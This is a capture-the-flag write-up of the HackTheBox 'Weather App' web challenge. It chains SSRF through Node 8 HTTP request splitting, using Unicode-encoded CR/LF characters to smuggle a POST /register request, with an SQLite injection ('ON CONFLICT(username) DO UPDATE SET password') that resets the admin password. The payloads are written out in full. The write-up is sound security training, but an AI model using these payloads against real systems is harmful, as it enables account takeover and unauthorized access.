# Weather App

<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/challenge.png" width="600px">

First thing to do is download the files and run a docker container with the challenge, in order to test everything easily and be able to mess with the source code so we can check with console.log() everything we try. 
Once we get it running, we can access the challenge at 127.0.0.1:1337

<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/mainPage.png" width="600px">

Now, let's dig into the code. This is a Node.js app using express, so we can see all 4 available routes at routes/index.js.

<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/main.png" width="500px">

<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/register.png" width="600px">

<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/login.png" width="600px">

<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/api.png" width="500px">

As we can see, to get the flag we must succesfuly login. The only requirement is to have an user with username 'admin'. However, in order to register a new user, the POST request must come from the server itself, so it would be nice to start looking for SSRF.

Let's take a look at the database functions inside database.js:

<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/database.png" width="700px">

migrate() function is used by index.js to initialize the database, so this functioin gives us some information about its initial state, such as that the username column is UNIQUE and that there is already an user with username 'admin'. This means that we cannot register another user with username 'admin' in order to directly login, we will need to either read the password or to change it.

isAdmin() function is not vulnerable to injection, since it uses '?' to insert the parameters in the query and they already sanitize escape quotes. However, register() function does, since it doesn't use '?'. This means that we can only inject malicious payloads into the database by registering a new user.

Let's inspect WeatherHelper.getWeather inside helpers/WeatherHelper.js, used in /api/weather:

<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/weather.png" width="700px">

Basically, getWeather() function makes a GET request to the specified endpoint and expects to receive a weatherData JSON object with all those attributes. Usually, /api/weather is used by the application in order to get information about the weather in our location. This is done by a function called in the client, inside /static/js/main.js:

<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/client.png" width="400px">

In order for getWeather() to make the GET request, it calls another function inside helpers/HttpHelper.js:

<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/httpGet.png" width="400px">

Now that we know how the application works, let's see how we can read the flag.


## Server-Side Request Forgery

In order to register a new user in the database and perform some SQL injection, we must trick the server into making itself the request to /register. Clearly, the way to do this is in /api/weather. 

After some trial and error and discarding a variety of options, I found out that the http module from Node 8 is vulnerable to [SSRF via Request Splitting](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/). Basically, we can trick http.get() function into making extra requests. 

When Node 8 sends the http request through the wire, it encodes the string as bytes with 'latin1' encoding. When it tries to encode characters that are longer than permitted, they get truncated. So, if we insert some Unicode characters such as '\u010D' or '\u010A', they get truncated and converted to '\r' and '\n'. Since those Unicode chars are not HTTP control characters, they are not escaped, but they are succesfully sent through the wire.

Using this vulnerability, we can make extra HTTP requests by injecting and encoding the corresponding request headers in the URI path. So, a request to 'http://127.0.0.1/' will produce:

    GET / HTTP/1.1
    Host: 127.0.0.1

An encoded request to 'http://127.0.0.1/ HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\nPOST /register HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\n\r\nusername=admin&password=admin\r\n\r\nGET /' will produce:

    GET / HTTP/1.1
    Host: 127.0.0.1

    POST /register HTTP/1.1
    Host: 127.0.0.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 29

    username=admin&password=admin

    GET / HTTP/1.1
    Host: 127.0.0.1

Spaces can be encoded as '\u0120', '\r' as '\u010D' and '\n' as '\u010A'. Characters ' and " must be URL encoded. So, the previous URL would like like 'http://127.0.0.1/ĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊčĊPOSTĠ/registerĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊContent-Type:Ġapplication/x-www-form-urlencodedčĊContent-Length:Ġ29čĊčĊusername=admin&password=adminčĊčĊGETĠ/Ġ'.

Now, we need to adapt this exploit to the application. As we have seen in /api/weather, we can specify an endpoint along with other parameters (since they are useless for this exploit, let's assume city = country = 'lol' from now on). The string in which it will be inserted is:

<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/url.png" width="700px">

If we send to the API an endpoint like '127.0.0.1/ĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊčĊPOSTĠ/registerĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊContent-Type:Ġapplication/x-www-form-urlencodedčĊContent-Length:Ġ29čĊčĊusername=admin&password=adminčĊčĊGETĠ/?lol=', the server will make a request to 'http://127.0.0.1/ĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊčĊPOSTĠ/registerĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊContent-Type:Ġapplication/x-www-form-urlencodedčĊContent-Length:Ġ29čĊčĊusername=admin&password=adminčĊčĊGETĠ/?lol=/data/2.5/weather?q=lol,lol&units=metric&appid=10a62430af617a949055a46fa6dec32f', and it will produce:

    GET / HTTP/1.1
    Host: 127.0.0.1

    POST /register HTTP/1.1
    Host: 127.0.0.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 29

    username=admin&password=admin

    GET /?lol=/data/2.5/weather?q=lol,lol&units=metric&appid=10a62430af617a949055a46fa6dec32f HTTP/1.1
    [...]

We can write an exploit to automate this:

<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/exploit1.png" width="700px">


## SQL Injection

Now, we can inject what we want in the register query:

<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/query.png" width="700px">

Recall that we are using the docker container on our local machine, so we can modify the server and insert console.log() wherever we want to check the effects of our payloads.

First thing we can try is Time-Based blind SQLi, since we cannot see the result of any query. SQLite (moduel used is sqlite-async) doesn't have a builtin functions for sleeping, but we can simulate it with randomblob(100000000), which will cause a bit of delay.
But, since the request is made by the server (not by us) and Node is asynchronous, we cannot spot the delay.

Trying stacked queries in password parameter such as

    1337'); UPDATE users SET password='admin' WHERE username='admin';--
    
will produce

    INSERT INTO users (username, password) VALUES ('user', '1337'); UPDATE users SET password='admin' WHERE username='admin';--')
    
But, we find out that stacked queries don't work in this database

However, there is a way to trick the INSERT query and update any value by specifying username = 'admin' and password:

    1337') ON CONFLICT(username) DO UPDATE SET password = 'admin';--
    
will produce

    INSERT INTO users (username, password) VALUES ('admin', 1337') ON CONFLICT(username) DO UPDATE SET password = 'admin';--')
    
If there is a conflict in username, the password will be updated to admin. Since username is defined initially as NOT NULL UNIQUE, if we try to insert 'admin', we will trigger this error as there is already an admin inside the database

Our final exploit is:

<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/exploit2.png" width="700px">

After executing it:

<img src="https://raw.githubusercontent.com/hacefresko/HTB-Web-WriteUps/main/Weather%20App/images/flag.gif" width="700px">
